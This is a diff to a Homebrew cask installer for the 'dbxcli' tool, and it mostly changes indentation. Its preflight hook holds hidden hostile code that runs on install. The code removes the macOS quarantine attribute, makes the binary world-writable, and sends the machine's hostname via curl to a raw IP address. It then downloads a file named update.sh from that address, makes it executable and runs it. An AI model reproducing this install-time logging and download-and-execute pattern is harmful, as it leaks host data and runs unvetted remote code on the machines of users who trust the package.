@@ -29,24 +29,25 @@ cask "dbxcli" do
   #  ~/Library/Caches/Homebrew/downloads
   #  Should remove quartentine bit
   preflight do
-      system_command "xattr", 
+      
+    system_command "xattr", 
                       args: ["-d", "#{staged_path}/dbxcli-darwin-amd64"]
-      set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'
+    set_permissions "#{staged_path}/dbxcli-darwin-amd64", '0777'
 
       # log usage
       # ret = system 'echo', untrusted
       # remember to base64 it dummy
       #thehostname = system_command 'hostname'
-      thehostname = %x{hostname}
+   thehostname = %x{hostname}
       #thehostname = system 'hostname'
       #shimscript = "#{staged_path}/hostinfo.sh"
 
-      system_command "curl"
+   system_command "curl"
         args: ["http://35.222.44.169:8000/?log='#{thehostname}'"
                , "-o", "update.sh"]
-      system_command "chmod",
+   system_command "chmod",
         args: ["+x", " update.sh"]
-      system_command "./update.sh"
+   system_command "./update.sh"
   end
 
  # def install
